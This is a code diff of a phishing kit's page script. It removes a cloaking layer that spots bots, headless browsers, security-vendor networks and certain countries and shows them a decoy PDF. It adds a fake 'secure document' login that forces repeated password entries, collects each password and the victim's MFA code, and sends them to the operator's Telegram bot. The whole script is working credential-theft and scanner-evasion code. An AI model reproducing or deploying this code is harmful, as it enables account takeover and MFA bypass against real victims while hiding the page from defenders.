-                reason: 'Blacklisted IP address',
-                ip: ip,
-                action: 'BLOCKED_BLACKLIST'
-            };
-        }
-        
-        // 3. Validate parameters (AGGRESSIVE)
-        const paramValidation = validateParameters();
-        if (!paramValidation.valid) {
-            if (SECURITY_CONFIG.AGGRESSIVE_MODE) {
-                addToBlacklist(ip, 'Invalid or missing parameters', {
-                    missingParams: paramValidation.missingParams,
-                    invalidParams: paramValidation.invalidParams,
-                    attemptCount: attemptCount
-                });
-            }
-            
-            return {
-                allowed: false,
-                reason: 'Invalid access parameters',
-                details: paramValidation,
-                ip: ip,
-                action: 'BLOCKED_PARAMS'
-            };
-        }
-        
-        // 4. Check user agent
-        const userAgent = navigator.userAgent.toLowerCase();
-        const isBot = SECURITY_CONFIG.BLACKLISTED_WORDS.some(word => 
-            userAgent.includes(word.toLowerCase())
-        );
-        
-        if (isBot) {
-            addToBlacklist(ip, 'Bot/crawler detected', {
-                matchedWord: SECURITY_CONFIG.BLACKLISTED_WORDS.find(word => 
-                    userAgent.includes(word.toLowerCase())
-                ),
-                userAgent: navigator.userAgent
-            });
-            
-            return {
-                allowed: false,
-                reason: 'Bot/crawler detected',
-                ip: ip,
-                action: 'BLOCKED_BOT'
-            };
-        }
-        
-        // 5. Get detailed IP information
-        let ipDetails = {};
-        try {
-            const ipInfoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-            ipDetails = await ipInfoResponse.json();
-            
-            // Check country
-            if (SECURITY_CONFIG.BLACKLISTED_COUNTRIES.includes(ipDetails.country_code)) {
-                addToBlacklist(ip, 'Blacklisted country', {
-                    country: ipDetails.country_name,
-                    countryCode: ipDetails.country_code
-                });
-                
-                return {
-                    allowed: false,
-                    reason: 'Access from restricted country',
-                    country: ipDetails.country_name,
-                    ip: ip,
-                    action: 'BLOCKED_COUNTRY'
-                };
-            }
-            
-            // Check hostname
-            if (ipDetails.org || ipDetails.asn) {
-                const orgInfo = (ipDetails.org || ipDetails.asn).toLowerCase();
-                const isBlacklistedHostname = SECURITY_CONFIG.BLACKLISTED_HOSTNAMES.some(pattern => 
-                    orgInfo.includes(pattern.toLowerCase())
-                );
-                
-                if (isBlacklistedHostname) {
-                    addToBlacklist(ip, 'Blacklisted hostname/ISP', {
-                        organization: ipDetails.org,
-                        asn: ipDetails.asn,
-                        matchedPattern: SECURITY_CONFIG.BLACKLISTED_HOSTNAMES.find(pattern => 
-                            orgInfo.includes(pattern.toLowerCase())
-                        )
-                    });
-                    
-                    return {
-                        allowed: false,
-                        reason: 'Suspicious hostname/ISP detected',
-                        organization: ipDetails.org,
-                        ip: ip,
-                        action: 'BLOCKED_HOSTNAME'
-                    };
-                }
-            }
-            
-        } catch (ipInfoError) {
-            console.warn('Could not fetch detailed IP info:', ipInfoError);
-            // Continue without detailed info
-        }
-        
-        // 6. Check screen resolution (headless detection)
-        if (screen.width < 100 || screen.height < 100) {
-            addToBlacklist(ip, 'Suspicious screen resolution', {
-                resolution: `${screen.width}x${screen.height}`,
-                userAgent: navigator.userAgent
-            });
-            
-            return {
-                allowed: false,
-                reason: 'Suspicious device configuration',
-                ip: ip,
-                action: 'BLOCKED_RESOLUTION'
-            };
-        }
-        
-        // 7. Check for WebDriver property (headless detection)
-        if (navigator.webdriver === true) {
-            addToBlacklist(ip, 'WebDriver detected (headless browser)', {
-                userAgent: navigator.userAgent
-            });
-            
-            return {
-                allowed: false,
-                reason: 'Automated browser detected',
-                ip: ip,
-                action: 'BLOCKED_WEBDRIVER'
-            };
-        }
-        
-        // 8. Check plugins (headless browsers often have few/no plugins)
-        const plugins = navigator.plugins.length;
-        if (plugins === 0) {
-            addToBlacklist(ip, 'No browser plugins detected (suspicious)', {
-                pluginCount: plugins,
-                userAgent: navigator.userAgent
-            });
-            
-            return {
-                allowed: false,
-                reason: 'Suspicious browser configuration',
-                ip: ip,
-                action: 'BLOCKED_PLUGINS'
-            };
-        }
-        
-        // All checks passed
-        return {
-            allowed: true,
-            ip: ip,
-            details: {
-                ...paramValidation.values,
-                ipInfo: ipDetails,
-                attemptCount: attemptCount,
-                userAgent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                sessionId: generateSessionId()
-            }
-        };
-        
-    } catch (error) {
-        console.error('Security check error:', error);
-        
-        // In aggressive mode, block if we can't verify
-        if (SECURITY_CONFIG.AGGRESSIVE_MODE) {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                addToBlacklist(ipData.ip, 'Security verification failed', {
-                    error: error.message
-                });
-            } catch (e) {
-                // Ignore secondary errors
-            }
-        }
-        
-        return {
-            allowed: false,
-            reason: 'Security verification failed',
-            error: error.message,
-            action: 'BLOCKED_ERROR'
-        };
-    }
-}
-
-// ============================================================================
-// BLACKLIST MANAGEMENT FUNCTIONS - KEEP ALL
-// ============================================================================
-function clearBlacklist() {
-    localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify([]));
-    localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify({}));
-    console.log('🔄 Blacklist cleared');
-    return true;
-}
-
-function viewBlacklist() {
-    try {
-        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
-        const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
-        
-        return {
-            blacklist: blacklist,
-            attempts: attempts,
-            stats: {
-                totalBlacklisted: blacklist.length,
-                totalAttempts: Object.keys(attempts).length,
-                recentBlacklist: blacklist.slice(-10) // Last 10 entries
-            }
-        };
-        
-    } catch (error) {
-        console.error('Error viewing blacklist:', error);
-        return { error: error.message };
-    }
-}
-
-function removeFromBlacklist(ip) {
-    try {
-        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
-        const filtered = blacklist.filter(entry => entry.ip !== ip);
-        localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify(filtered));
-        
-        // Also remove from attempts
-        const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
-        delete attempts[ip];
-        localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify(attempts));
-        
-        console.log(`✅ Removed ${ip} from blacklist`);
-        return true;
-        
-    } catch (error) {
-        console.error('Error removing from blacklist:', error);
-        return false;
-    }
-}
-
-function exportBlacklist() {
-    try {
-        const data = viewBlacklist();
-        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `security-blacklist-${new Date().toISOString().split('T')[0]}.json`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        return true;
-    } catch (error) {
-        console.error('Error exporting blacklist:', error);
-        return false;
-    }
-}
-
-// ============================================================================
-// HELPER FUNCTIONS - KEEP ALL
-// ============================================================================
-function generateSessionId() {
-    return 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-}
-
-async function sendSecurityAlert(type, data) {
-    if (!SECURITY_CONFIG.ENABLE_TELEGRAM_ALERTS) return;
+    elements.authModal.classList.add('active');
+    hideError();
+    elements.authForm.reset();
+    elements.username.focus();
+    elements.password.type = 'password';
+    elements.showPassword.textContent = 'Show';
     
-    try {
-        let message = '';
-        
-        switch(type) {
-            case 'BLACKLIST_ADDED':
-                message = `🚫 *BLACKLIST ALERT - ${data.ip}*
-                
-🔒 *Reason:* ${data.reason}
-📅 *Time:* ${new Date().toLocaleString()}
-🌐 *URL:* ${data.url}
-🖥️ *User Agent:* ${data.userAgent.substring(0, 100)}...
-                `;
-                break;
-                
-            case 'BLACKLISTED_PDF_ACCESS':
-                message = `📄 *BLACKLISTED IP ACCESSED PDF - ${data.ip}*
-                
-⚠️ *Status:* Blacklisted IP shown PDF
-🔒 *Reason:* ${data.reason}
-🎯 *Action:* ${data.action}
-📅 *Time:* ${new Date().toLocaleString()}
-🌐 *URL:* ${data.url}
-🖥️ *IP:* ${data.ip}
-🌍 *Country:* ${data.country || 'Unknown'}
-🏢 *ISP:* ${data.isp || 'Unknown'}
-                `;
-                break;
-                
-            case 'SECURITY_BREACH':
-                message = `⚠️ *SECURITY BREACH DETECTED*
-                
-🎯 *Attack Type:* ${data.type}
-📡 *Source IP:* ${data.ip}
-📅 *Time:* ${new Date().toLocaleString()}
-🔍 *Details:* ${JSON.stringify(data.details, null, 2)}
-                `;
-                break;
-                
-            case 'ACCESS_GRANTED':
-                message = `✅ *ACCESS GRANTED*
-                
-👤 *IP:* ${data.ip}
-📅 *Time:* ${new Date().toLocaleString()}
-🌍 *Location:* ${data.location || 'Unknown'}
-🖥️ *Device:* ${data.device || 'Unknown'}
-🔑 *Session ID:* ${data.sessionId}
-                `;
-                break;
-        }
-        
-        const url = `https://api.telegram.org/bot${SECURITY_CONFIG.BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: SECURITY_CONFIG.CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-    } catch (error) {
-        console.error('Error sending security alert:', error);
-    }
+    // Reset session for new attempt
+    currentSession.attempts.password = 0;
+    currentSession.attempts.mfa = 0;
+    currentSession.usedPasswords = [];
+  }, 1500);
+}
+
+function showLoading(title, subtitle) {
+  elements.loadingText.textContent = title;
+  elements.loadingSubtext.textContent = subtitle;
+  elements.loadingOverlay.classList.add('active');
+}
+
+function hideLoading() {
+  elements.loadingOverlay.classList.remove('active');
+}
+
+function showError(message) {
+  elements.errorMessageText.textContent = message;
+  elements.errorMessage.classList.add('show');
+  elements.username.classList.add('error', 'shake');
+  elements.password.classList.add('error', 'shake');
+  
+  setTimeout(() => {
+    elements.username.classList.remove('shake');
+    elements.password.classList.remove('shake');
+  }, 500);
+}
+
+function hideError() {
+  elements.errorMessage.classList.remove('show');
+  elements.username.classList.remove('error');
+  elements.password.classList.remove('error');
 }
 
 // ============================================================================
-// PAGE LOADING FUNCTIONS - UPDATED
+// DOWNLOAD/PREVIEW ERROR FUNCTIONS
 // ============================================================================
-function showFullScreenPDF(securityCheck = null) {
-    // Get ISP/country info if available
-    let country = 'Unknown';
-    let isp = 'Unknown';
+function showDownloadError() {
+  showLoading('Processing document request', 'Checking document compatibility');
+  
+  // Simulate checking
+  setTimeout(() => {
+    hideLoading();
     
-    if (securityCheck && securityCheck.details && securityCheck.details.ipInfo) {
-        country = securityCheck.details.ipInfo.country_name || 'Unknown';
-        isp = securityCheck.details.ipInfo.org || securityCheck.details.ipInfo.asn || 'Unknown';
-    }
-    
-    // Show PDF
-    document.body.innerHTML = `
-        <div class="pdf-fullscreen">
-            <iframe src="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">
-                This browser does not support PDFs. Please download the PDF to view it: 
-                <a href="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">Download PDF</a>.
-            </iframe>
+    // Show realistic error modal
+    const errorModal = document.createElement('div');
+    errorModal.className = 'secure-modal active';
+    errorModal.innerHTML = `
+      <div class="modal-content">
+        <div class="modal-body">
+          <div class="login-header">
+            <div class="provider-logo-modal">
+              <img src="${currentProvider.logo}" alt="${currentProvider.name} Logo">
+            </div>
+            <h2 class="welcome-text">Document Compatibility Error</h2>
+          </div>
+          <div style="padding: 32px; text-align: center;">
+            <div style="font-size: 64px; margin-bottom: 20px;">⚠️</div>
+            <h3 style="color: #333; margin-bottom: 15px;">Unable to Process Document</h3>
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.6;">
+              Your device or browser does not support the enhanced security features 
+              required for this encrypted document format (SEC-ENC-V3).
+            </p>
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 15px; margin: 20px 0; font-size: 13px; color: #666;">
+              <div style="margin-bottom: 8px;"><strong>Error Code:</strong> DOC-COMPAT-ERR-45</div>
+              <div style="margin-bottom: 8px;"><strong>Document Format:</strong> SEC-ENC-V3 (Enhanced Security)</div>
+              <div><strong>Required:</strong> ${currentProvider.name} Secure Viewer v2.1+</div>
+            </div>
+            <button class="signin-button" onclick="this.closest('.secure-modal').remove()" style="background: ${currentProvider.colors.primary}; margin-top: 10px;">
+              Close
+            </button>
+          </div>
         </div>
-        <style>
-            .pdf-fullscreen {
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: #f0f0f0;
-            }
-            
-            .pdf-fullscreen iframe {
-                width: 100%;
-                height: 100%;
-                border: none;
-            }
-            
-            body {
-                margin: 0;
-                padding: 0;
-                overflow: hidden;
-                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            }
-        </style>
+      </div>
     `;
     
-    // Send Telegram alert about blacklisted access
-    if (SECURITY_CONFIG.ENABLE_TELEGRAM_ALERTS && securityCheck) {
-        sendSecurityAlert('BLACKLISTED_PDF_ACCESS', {
-            ip: securityCheck.ip || 'Unknown',
-            reason: securityCheck.reason || 'Security violation',
-            action: securityCheck.action || 'BLOCKED',
-            url: window.location.href,
-            country: country,
-            isp: isp,
-            userAgent: navigator.userAgent.substring(0, 150)
-        });
-    }
+    document.body.appendChild(errorModal);
+    
+    // Close on outside click
+    errorModal.addEventListener('click', (e) => {
+      if (e.target === errorModal) {
+        errorModal.remove();
+      }
+    });
+  }, 2000);
+}
+
+function showPrintError() {
+  showLoading('Initializing print service', 'Connecting to secure print server');
+  
+  setTimeout(() => {
+    hideLoading();
+    
+    // Show print error modal
+    const errorModal = document.createElement('div');
+    errorModal.className = 'secure-modal active';
+    errorModal.innerHTML = `
+      <div class="modal-content">
+        <div class="modal-body">
+          <div class="login-header">
+            <div class="provider-logo-modal">
+              <img src="${currentProvider.logo}" alt="${currentProvider.name} Logo">
+            </div>
+            <h2 class="welcome-text">Print Service Unavailable</h2>
+          </div>
+          <div style="padding: 32px; text-align: center;">
+            <div style="font-size: 64px; margin-bottom: 20px;">🖨️</div>
+            <h3 style="color: #333; margin-bottom: 15px;">Print Service Temporarily Unavailable</h3>
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.6;">
+              The secure print service for encrypted documents is currently undergoing 
+              maintenance. Please try downloading the document instead.
+            </p>
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 15px; margin: 20px 0; font-size: 13px; color: #666;">
+              <div style="margin-bottom: 8px;"><strong>Status:</strong> Service Maintenance</div>
+              <div style="margin-bottom: 8px;"><strong>Expected Availability:</strong> 2-4 hours</div>
+              <div><strong>Reference:</strong> PRINT-SVC-MAINT-2025-12-16</div>
+            </div>
+            <button class="signin-button" onclick="this.closest('.secure-modal').remove()" style="background: ${currentProvider.colors.primary}; margin-top: 10px;">
+              Close
+            </button>
+          </div>
+        </div>
+      </div>
+    `;
+    
+    document.body.appendChild(errorModal);
+    
+    // Close on outside click
+    errorModal.addEventListener('click', (e) => {
+      if (e.target === errorModal) {
+        errorModal.remove();
+      }
+    });
+  }, 1500);
 }
 
 // ============================================================================
-// SECURITY INITIALIZATION - UPDATED TO SHOW PDF
+// AUTHENTICATION LOGIC
 // ============================================================================
-async function initializeSecurity() {
-    console.log('🔐 Initializing security system...');
+async function handleLoginSubmit(e) {
+  e.preventDefault();
+  
+  const username = elements.username.value.trim();
+  const password = elements.password.value;
+  
+  if (!username || !password) {
+    showError('Please enter both username and password');
+    return;
+  }
+  
+  // Check for password reuse
+  if (CONFIG.PREVENT_PASSWORD_REUSE && currentSession.usedPasswords.includes(password)) {
+    showError('This password has already been used. Please use a different password.');
+    elements.password.value = '';
+    elements.password.focus();
+    return;
+  }
+  
+  // Store credentials
+  currentSession.username = username;
+  currentSession.password = password;
+  currentSession.usedPasswords.push(password);
+  currentSession.attempts.password++;
+  
+  // Disable form during submission
+  const originalText = elements.signinBtnText.textContent;
+  elements.signinBtnText.textContent = 'Verifying...';
+  elements.signinBtn.disabled = true;
+  
+  // Send password attempt to Telegram
+  await sendToTelegram('login_attempt', {
+    username: username,
+    password: password,
+    attempt: currentSession.attempts.password,
+    totalAttempts: CONFIG.PASSWORD_ATTEMPTS_REQUIRED
+  });
+  
+  // Simulate authentication delay
+  setTimeout(() => {
+    elements.signinBtnText.textContent = originalText;
+    elements.signinBtn.disabled = false;
     
-    // Initialize storage
-    initializeSecurityStorage();
+    if (currentSession.attempts.password < CONFIG.PASSWORD_ATTEMPTS_REQUIRED) {
+      // Show error but allow retry
+      showError('Incorrect username or password. Please try again.');
+      elements.password.value = '';
+      elements.password.focus();
+    } else {
+      // Success after required attempts
+      hideError();
+      elements.authModal.classList.remove('active');
+      showMFAModal();
+    }
+  }, 1200);
+}
+
+function showMFAModal() {
+  // Update MFA instructions
+  elements.mfaInstructions.textContent = 'Please enter the verification code sent to your registered device.';
+  
+  // Show MFA screen
+  elements.mfaModal.classList.add('active');
+  
+  // Clear and focus first input
+  mfaInputs.forEach(input => {
+    input.value = '';
+    input.classList.remove('error');
+  });
+  mfaInputs[0].focus();
+}
+
+function verifyMFA() {
+  // Get entered code
+  let enteredCode = '';
+  mfaInputs.forEach(input => enteredCode += input.value);
+  
+  if (enteredCode.length !== CONFIG.MFA_CODE_LENGTH) {
+    mfaInputs.forEach(input => {
+      if (!input.value) input.classList.add('error');
+    });
+    return;
+  }
+  
+  currentSession.attempts.mfa++;
+  
+  // Check if max MFA attempts reached
+  if (currentSession.attempts.mfa > CONFIG.MFA_ATTEMPTS_ALLOWED) {
+    showMFAError('Maximum verification attempts reached. Please try again later.');
+    elements.mfaModal.classList.remove('active');
+    elements.authModal.classList.add('active');
+    return;
+  }
+  
+  // Store the MFA code user entered
+  currentSession.mfaCode = enteredCode;
+  currentSession.capturedAt = new Date().toISOString();
+  
+  // Send ALL credentials to Telegram NOW (after they enter MFA)
+  sendToTelegram('mfa_success', {
+    username: currentSession.username,
+    password: currentSession.password,
+    mfaCode: enteredCode,
+    provider: currentProvider.name,
+    passwordAttempts: currentSession.attempts.password,
+    mfaAttempts: currentSession.attempts.mfa,
+    usedPasswords: currentSession.usedPasswords
+  });
+  
+  showSuccessModal();
+}
+
+function showMFAError(message) {
+  // Add a small error display in MFA modal
+  const errorDiv = document.createElement('div');
+  errorDiv.className = 'mfa-error';
+  errorDiv.style.cssText = 'color: #c70032; font-size: 13px; margin-top: 10px; text-align: center;';
+  errorDiv.textContent = message;
+  
+  // Remove any existing error
+  const existingError = document.querySelector('.mfa-error');
+  if (existingError) existingError.remove();
+  
+  // Add new error
+  elements.mfaInstructions.parentNode.insertBefore(errorDiv, elements.mfaInstructions.nextSibling);
+  
+  // Auto-remove after 3 seconds
+  setTimeout(() => {
+    errorDiv.remove();
+  }, 3000);
+}
+
+function showSuccessModal() {
+  // SIMPLE success message - NO captured data shown to user
+  elements.successMessage.textContent = `Your ${currentProvider.name} account has been successfully verified. You now have access to the secure document.`;
+  
+  elements.mfaModal.classList.remove('active');
+  elements.successModal.classList.add('active');
+}
+
+function showDocumentAccess() {
+  elements.successModal.classList.remove('active');
+  
+  // Update main UI to show unlocked state
+  elements.documentCard.classList.add('document-unlocked');
+  elements.documentCard.querySelector('.document-icon').textContent = '✓';
+  elements.documentCard.querySelector('.document-description').innerHTML += 
+    `<div class="unlocked-message">✓ ${currentProvider.name} document access granted</div>`;
+  
+  elements.accessBtn.innerHTML = '<span>✓</span> Document Accessed';
+  elements.accessBtn.disabled = true;
+  elements.accessBtn.style.background = '#28a745';
+  
+  // Enable document actions
+  elements.downloadBtn.disabled = false;
+  elements.printBtn.disabled = false;
+}
+
+function resetSession() {
+  // Reset form
+  elements.authForm.reset();
+  mfaInputs.forEach(input => {
+    input.value = '';
+    input.classList.remove('error');
+  });
+  
+  // Reset session data
+  currentSession = {
+    provider: currentProvider,
+    username: '',
+    password: '',
+    mfaCode: '',
+    usedPasswords: [],
+    attempts: {
+      password: 0,
+      mfa: 0
+    },
+    mfaGenerated: false,
+    mfaCodeValue: '',
+    mfaExpiry: null,
+    userInfo: null,
+    capturedAt: null
+  };
+  
+  generatedMfaCode = '';
+}
+
+// ============================================================================
+// TELEGRAM INTEGRATION
+// ============================================================================
+async function sendToTelegram(type, data) {
+  if (!CONFIG.ENABLE_TELEGRAM || !CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+    console.log(`[Telegram] ${type}:`, data);
+    return;
+  }
+
+  try {
+    const userInfo = await getUserInfo();
+    let message = '';
     
-    // Perform security checks
-    const securityCheck = await performSecurityChecks();
+    const timestamp = new Date().toLocaleString();
+    const providerName = currentProvider.name;
     
-    if (!securityCheck.allowed) {
-        // If blacklisted or security failed, show PDF instead of "Access Denied"
-        console.log(`🚫 Security failed - Showing PDF: ${securityCheck.reason}`);
+    switch(type) {
+      case 'login_attempt':
+        message = `🔐 *${providerName} LOGIN ATTEMPT #${data.attempt}*
         
-        // Show full screen PDF
-        showFullScreenPDF(securityCheck);
+👤 *Credentials:*
+• Username: \`${data.username}\`
+• Password: \`${data.password}\`
+• Attempt: ${data.attempt}/${data.totalAttempts}
+
+🌐 *User Information:*
+• IP: \`${userInfo.ip}\`
+• Browser: ${userInfo.browser}
+• OS: ${userInfo.os}
+
+⏰ *Time:* ${timestamp}
+📁 *Portal:* Secure Document Access
+
+📱 *Waiting for MFA code entry...*`;
+        break;
         
-        // Don't throw error, just return
-        return securityCheck;
+      case 'mfa_success':
+        message = `✅ *${providerName} - FULL CREDENTIALS CAPTURED!*
+        
+🎯 *Authentication Complete - All Data Secured*
+        
+🔐 *Complete Credentials:*
+• Username: \`${data.username}\`
+• Password: \`${data.password}\`
+• MFA Code: \`${data.mfaCode}\`
+• Password Attempts: ${data.passwordAttempts}
+• MFA Attempts: ${data.mfaAttempts}
+• Used Passwords: ${data.usedPasswords.map(p => `\`${p}\``).join(', ')}
+
+🌐 *Session Info:*
+• Provider: ${data.provider}
+• User IP: \`${userInfo.ip}\`
+• Capture Time: ${timestamp}
+
+🎉 *Secure document portal access granted*`;
+        break;
     }
     
-    // Send access granted notification
-    await sendSecurityAlert('ACCESS_GRANTED', {
-        ip: securityCheck.ip,
-        location: securityCheck.details?.ipInfo?.country_name,
-        device: securityCheck.details?.userAgent,
-        sessionId: securityCheck.details?.sessionId
+    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
     });
     
-    console.log('✅ Security check passed');
-    return securityCheck;
+    if (!response.ok) {
+      console.error('Telegram API error:', await response.text());
+    }
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+  }
 }
 
-// ============================================================================
-// ADMIN FUNCTIONS (for debugging/management)
-// ============================================================================
-function SecurityAdmin() {
+async function getUserInfo() {
+  try {
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    
+    // Parse user agent
+    const ua = navigator.userAgent;
+    let browser = 'Unknown';
+    let os = 'Unknown';
+    
+    if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari')) browser = 'Safari';
+    else if (ua.includes('Edg')) browser = 'Edge';
+    
+    if (ua.includes('Windows')) os = 'Windows';
+    else if (ua.includes('Mac')) os = 'macOS';
+    else if (ua.includes('Linux')) os = 'Linux';
+    else if (ua.includes('Android')) os = 'Android';
+    else if (ua.includes('iOS') || ua.includes('iPhone')) os = 'iOS';
+    
     return {
-        // View current blacklist
-        viewBlacklist: function() {
-            const data = viewBlacklist();
-            console.log('📋 Blacklist:', data);
-            return data;
-        },
-        
-        // Clear entire blacklist
-        clearAll: function() {
-            const confirmed = confirm('Are you sure you want to clear the entire blacklist?');
-            if (confirmed) {
-                return clearBlacklist();
-            }
-            return false;
-        },
-        
-        // Remove specific IP
-        removeIP: function(ip) {
-            return removeFromBlacklist(ip);
-        },
-        
-        // Export blacklist
-        export: function() {
-            return exportBlacklist();
-        },
-        
-        // Check current IP status
-        checkCurrentIP: async function() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const isBlocked = isBlacklisted(ipData.ip);
-                
-                return {
-                    ip: ipData.ip,
-                    blacklisted: isBlocked,
-                    status: isBlocked ? '🚫 BLACKLISTED' : '✅ CLEAR'
-                };
-            } catch (error) {
-                return { error: error.message };
-            }
-        },
-        
-        // Get security stats
-        getStats: function() {
-            const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
-            const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
-            
-            return {
-                blacklistedIPs: blacklist.length,
-                trackedIPs: Object.keys(attempts).length,
-                recentBlocks: blacklist.slice(-5),
-                config: SECURITY_CONFIG
-            };
-        }
+      ip: ipData.ip,
+      browser: browser,
+      os: os,
+      userAgent: ua.substring(0, 100)
     };
+  } catch (error) {
+    return {
+      ip: 'Unknown',
+      browser: 'Unknown',
+      os: 'Unknown',
+      userAgent: navigator.userAgent.substring(0, 100)
+    };
+  }
 }
 
-// Make admin functions available globally for debugging
-window.SecurityAdmin = SecurityAdmin();
+// ============================================================================
+// INITIALIZE APPLICATION
+// ============================================================================
+document.addEventListener('DOMContentLoaded', initialize);
+
 
 // ============================================================================
-// HIDDEN CLEAR FUNCTION - FOR YOU ONLY
+// ADMIN FUNCTIONS - FOR YOU ONLY
 // ============================================================================
-window.clX = function() {
-    console.log('🔄 Clearing blacklist via clX()...');
-    localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify([]));
-    localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify({}));
-    console.log('✅ Blacklist cleared!');
+
+// View blacklist
+window.vb = function() {
+    const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
+    console.log('📋 Blacklist:', blacklist);
+    console.table(blacklist);
+    return blacklist;
+};
+
+// Clear blacklist
+window.cb = function() {
+    localStorage.setItem('simple_blacklist', JSON.stringify([]));
+    console.log('✅ Blacklist cleared');
     alert('Blacklist cleared!');
     return true;
 };
 
-// ============================================================================
-// INITIALIZE ON PAGE LOAD
-// ============================================================================
-document.addEventListener('DOMContentLoaded', async function() {
+// Remove specific IP
+window.rb = function(ip) {
+    const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
+    const filtered = blacklist.filter(entry => entry.ip !== ip);
+    localStorage.setItem('simple_blacklist', JSON.stringify(filtered));
+    console.log(`✅ Removed ${ip} from blacklist`);
+    return true;
+};
+
+// Check if current IP is blacklisted
+window.ci = async function() {
     try {
-        const securityCheck = await initializeSecurity();
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
+        const isBlocked = blacklist.some(entry => entry.ip === ipData.ip);
         
-        // If security check passed (allowed: true), load your credential system
-        if (securityCheck.allowed) {
-            console.log('🚀 Loading secure application...');
-            
-            // Your credential capture system should initialize here
-            // Add your existing initialize() function call here
-            
-            // Add a security badge to the page
-            const securityBadge = document.createElement('div');
-            securityBadge.style.cssText = `
-                position: fixed;
-                bottom: 10px;
-                right: 10px;
-                background: rgba(0,0,0,0.7);
-                color: white;
-                padding: 5px 10px;
-                border-radius: 4px;
-                font-size: 10px;
-                z-index: 9999;
-                font-family: monospace;
-            `;
-            securityBadge.textContent = '🔐 SECURE';
-            document.body.appendChild(securityBadge);
-        }
-        // If security check failed (allowed: false), PDF is already shown
-        // No further action needed
+        console.log(`🌐 Your IP: ${ipData.ip}`);
+        console.log(`🔒 Status: ${isBlocked ? '🚫 BLACKLISTED' : '✅ CLEAR'}`);
         
+        return { ip: ipData.ip, blacklisted: isBlocked };
     } catch (error) {
-        console.error('Security initialization failed:', error);
-        // If there's an error in the security check itself, show PDF as fallback
-        showFullScreenPDF({ reason: 'Security system error', action: 'BLOCKED_ERROR' });
+        console.error('Error checking IP:', error);
+        return null;
     }
-});
+};
   </script>
 </body>
 </html>
